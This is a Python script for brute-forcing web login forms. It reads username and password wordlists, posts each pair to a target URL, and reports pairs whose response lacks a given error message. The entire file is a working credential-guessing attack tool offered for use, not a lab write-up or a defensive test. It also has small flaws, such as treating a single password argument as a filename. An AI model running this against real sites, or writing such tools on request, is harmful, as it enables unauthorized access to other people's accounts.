import os
import argparse
import requests

def http_bruteforce(target, ulabel, plabel, userfile, passfile,error, user=None, password=None):

    # If we already know the username then only fuzz for password
    try:
        if passfile and user:
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for password in passwords:
                password = password.strip()
                response = requests.post(target, data={ulabel:user, plabel:password})
                if response.status_code == 200 and error not in response.text:
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break
                else:
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        # If we don't know the username then fuzz for both username and password
        elif userfile and passfile:
            with open(userfile, 'r') as f:
                users = f.readlines()
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    response = requests.post(target, data={ulabel:user, plabel:password})
                    print(response.status_code)
                    print(response.headers)
                    if response.status_code == 200 and error not in response.text:
                        print(f'\033[92m [+]\033[0m {user} : ', password)
                        break
                    else:
                        print(f'\033[91m [-]\033[0m {user} : ', password)
        
        else: 
            print('\033[91m [-]\033[0m Please provide both username and password files')
            exit(1)

    except KeyboardInterrupt:
        print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
        exit(1)

def main():
    parser = argparse.ArgumentParser(description='HTTP Bruteforce')

    parser.add_argument('-t','--target', type=str, help='Target URL')
    parser.add_argument('-e','--error', type=str, help='Error message for invalid login attempt')
    parser.add_argument('-userlabel', type=str, help='User label')
    parser.add_argument('-passlabel', type=str, help='Password label')

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--user', type=str, help='Username')
    group.add_argument('-U', '--userfile', type=argparse.FileType('r'), help='User file')

    group_p = parser.add_mutually_exclusive_group(required=True)
    group_p.add_argument('-p', '--passw', type=str, help='Password')
    group_p.add_argument('-P', '--passfile', type=argparse.FileType('r'), help='Password file')
    args = parser.parse_args()

    if args.userfile:
        userfile = args.userfile.name
    else:
        userfile = args.user

    if args.passfile:
        passfile = args.passfile.name
    else:
        passfile = args.passw

    http_bruteforce( args.target, args.userlabel, args.passlabel, userfile, passfile, args.error , args.user, args.passw)
 

if __name__ == '__main__':
    main()














